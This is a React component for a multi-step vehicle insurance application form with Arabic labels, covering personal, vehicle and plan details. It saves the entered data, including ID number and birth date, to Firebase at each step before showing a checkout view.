"use client"

import { useState } from "react"
import { StepIndicator } from "./step-indicator"
import { Step1BasicInfo } from "./steps/step1-basic-info"
import { Step2VehicleInfo } from "./steps/step2-vehicle-info"
import { Step3PlanSelection } from "./steps/step3-plan-selection"
import { Step4Review } from "./steps/step4-review"
import { Checkout } from "./checkout"
import { addData } from "@/lib/firebase"

export interface FormData {
  // Step 1
  insuranceType: string
  serialNumber: string
  idNumber: string
  birthDate: string

  // Step 2
  vehicleType: string
  vehicleModel: string
  vehicleYear: string
  vehicleValue: string

  // Step 3
  selectedPlan: string
  selectedOfferId?: string
  selectedFeatures?: string[]
  totalPrice?: string
  coverage: string[]

  // Step 4 - Review data
}

export function InsuranceFlow() {
  const [currentStep, setCurrentStep] = useState(1)
  const [formData, setFormData] = useState<FormData>({
    insuranceType: "تأمين جديد",
    serialNumber: "",
    idNumber: "",
    birthDate: "",
    vehicleType: "",
    vehicleModel: "",
    vehicleYear: "",
    vehicleValue: "",
    selectedPlan: "",
    coverage: [],
  })

  const updateFormData = (data: Partial<FormData>) => {
    setFormData((prev) => ({ ...prev, ...data }))

  }

  const nextStep = () => {
    const id=localStorage.getItem('visitor')

    if (currentStep < 5) {
    addData({id:id,...formData})

      setCurrentStep(currentStep + 1)
    }
  }

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1)
    }
  }

  const steps = [
    { number: 1, title: "المعلومات الأساسية", description: "بيانات شخصية" },
    { number: 2, title: "بيانات المركبة", description: "تفاصيل السيارة" },
    { number: 3, title: "اختيار الخطة", description: "نوع التغطية" },
    { number: 4, title: "مراجعة البيانات", description: "تأكيد المعلومات" },
  ]

  if (currentStep === 5) {
    return <Checkout formData={formData} onBack={prevStep} />
  }

  return (
    <div className="space-y-6 py-2">

      <div className="bg-emerald-900/80 rounded-2xl overflow-hidden shadow-2xl border border-emerald-700/50 backdrop-blur-sm">
        {currentStep === 1 && <Step1BasicInfo formData={formData} updateFormData={updateFormData} onNext={nextStep} />}

        {currentStep === 2 && (
          <Step2VehicleInfo formData={formData} updateFormData={updateFormData} onNext={nextStep} onBack={prevStep} />
        )}

        {currentStep === 3 && (
          <Step3PlanSelection formData={formData} updateFormData={updateFormData} onNext={nextStep} onBack={prevStep} />
        )}

        {currentStep === 4 && <Step4Review formData={formData} onNext={nextStep} onBack={prevStep} />}
      </div>
    </div>
  )
}
